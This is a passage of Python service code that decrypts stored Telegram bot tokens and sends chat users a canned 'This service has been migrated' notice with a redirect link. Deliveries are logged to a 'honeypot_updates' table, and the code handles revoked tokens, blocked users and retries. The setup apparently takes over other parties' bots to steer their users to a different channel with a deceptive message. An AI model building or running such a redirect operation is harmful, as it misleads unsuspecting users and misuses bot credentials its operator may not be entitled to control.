        await _release_pending_claim("token_decrypt_failed")
        return {"status": "token_decrypt_failed", "error": str(e)[:200]}

    # BUG-3 FIX: Define redirect_1 text for normal message path
    text = (
        "⚠️ This service has been migrated.\n"
        "Your request could not be processed here.\n"
        "To continue, use the updated channel:\n"
        f"👉 {redirect_url}\n"
        "This is an automated notification."
    )

    # Immediate pre-send fence check directly before outbound Bot API call
    if not await _is_fence_valid():
        await _cleanup_inflight()
        logger.warning(f"🔀 [Redirect] Fenced out immediately pre-send for {update_id}")
        return {"status": "fenced_out", "credential_id": credential_id}

    # Send the message via Bot API
    http_status = None
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            r = await client.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": text,
                    "disable_web_page_preview": False,
                },
            )
            http_status = r.status_code
            try:
                response_body = r.json()
            except ValueError:
                response_body = {"error": str(getattr(r, "text", "")).strip()}
            resp = (
                response_body
                if isinstance(response_body, dict)
                else {"error": str(response_body)}
            )
            delivery = _telegram_delivery_result("sendMessage", r.status_code, resp)
    except Exception as e:
        delivery = _telegram_transport_error("sendMessage", e, bot_token)

    sent_ok = delivery.accepted
    redirect_error = delivery.error

    # Dead token handling: HTTP 401 Unauthorized
    is_dead_token = http_status == 401 or "unauthorized" in str(redirect_error or "").lower()
    if is_dead_token:
        await _cleanup_inflight()
        logger.warning(
            f"🔀 [Redirect] Skipped dead-token job for cred:{credential_id[:8]}...: token revoked (HTTP 401)"
        )
        now_term = datetime.now(UTC).isoformat()
        try:
            from app.core.redis_srv import redis_srv
            redis_srv.client.set(f"credential:revoked:{credential_id}", "1", ex=86400 * 7)
        except Exception:
            pass
        with contextlib.suppress(Exception):
            await _mark_credential_revoked(credential_id, f"Bot token revoked ({redirect_error})")
        with contextlib.suppress(Exception):
            await async_execute(
                db.table("honeypot_updates")
                .update({
                    "redirected_at": now_term,
                    "redirect_claimed_at": None,
                    "redirected_bot": "token_revoked",
                    "redirect_error": redirect_error,
                    "sender_user_id": user_id,
                })
                .eq("id", update_id)
            )
        return {"status": "skipped", "reason": "token_revoked", "credential_id": credential_id}

    # Blocked user handling: HTTP 403 Forbidden
    is_blocked = http_status == 403 or "blocked by the user" in str(redirect_error or "").lower()
    if is_blocked:
        await _cleanup_inflight()
        logger.warning(
            f"🔀 [Redirect] User blocked bot for cred:{credential_id[:8]}...: {redirect_error}"
        )
        now_term = datetime.now(UTC).isoformat()
        with contextlib.suppress(Exception):
            await async_execute(
                db.table("honeypot_updates")
                .update({
                    "redirected_at": now_term,
                    "redirect_claimed_at": None,
                    "redirected_bot": "user_blocked",
                    "redirect_error": redirect_error,
                    "sender_user_id": user_id,
                })
                .eq("id", update_id)
            )
        return {"status": "failed", "reason": "user_blocked", "credential_id": credential_id}

    # BUG-4 FIX: Write redirect_1_sent_at on first successful send
    # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
    now = datetime.now(UTC).isoformat()
    try:
        if sent_ok:
            update_payload = {
                "redirected_at": now,
                "redirect_claimed_at": None,
                "redirected_bot": redirect_bot,
                "sender_user_id": user_id,
                "redirect_1_sent_at": now,
                "redirect_method": delivery.method,
                "redirect_1_message_id": delivery.message_id,
                "redirect_attempt": 1,
            }
        else:
            curr_attempt = 1
            try:
                att_res = await async_execute(
                    db.table("honeypot_updates")
                    .select("redirect_attempt")
                    .eq("id", update_id)
                    .limit(1)
                )
                if att_res.data:
                    curr_attempt = att_res.data[0].get("redirect_attempt") or 1
            except Exception:
                pass

            if curr_attempt >= 3:
                update_payload = {
                    "redirected_at": now,
                    "redirect_claimed_at": None,
                    "redirected_bot": "max_retries_exceeded",
                    "redirect_error": f"Max retries exceeded: {redirect_error}",
                    "sender_user_id": user_id,
                }
            else:
                update_payload = {
                    "redirected_at": None,
                    "redirect_claimed_at": None,
                    "redirect_error": redirect_error,
                    "sender_user_id": user_id,
                }
        query = (
            db.table("honeypot_updates")
            .update(update_payload)
            .eq("id", update_id)
        )
        update_res = await async_execute(query)
        if not update_res.data:
            logger.warning(
                f"🔀 [Redirect] Row {update_id} update failed"
            )
            await _cleanup_inflight()
            return {"status": "failed", "credential_id": credential_id}
    except Exception as persistence_error:
        logger.warning(
            f"[Redirect] delivery evidence persistence failed credential={credential_id} "
            f"message_id={delivery.message_id} reason={persistence_error}"
        )
        await _cleanup_inflight()
        return {
            "status": "failed",
            "reason": "evidence_persistence_failed",
            "credential_id": credential_id,
        }

    # BUG-5 FIX: Set permanent dedup key on success, or safely release claiming reservation on failure
    try:
        from app.core.redis_srv import redis_srv
        if sent_ok:
            redis_srv.client.set(dedup_key, "1")
        else:
            _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
    except Exception as _swallowed:
        logger.debug(f"[suppressed] {_swallowed}")

    await _cleanup_inflight()

    if sent_ok:
        _log_recorded_delivery(delivery, now)
    else:
        logger.warning(
            f"🔀 [Redirect] FAILED cred:{credential_id[:8]}...: "
            f"{redirect_error}"
        )

    return {
        "status": "sent" if sent_ok else "failed",
        "credential_id": credential_id,
        "bot": redirect_bot,
    }
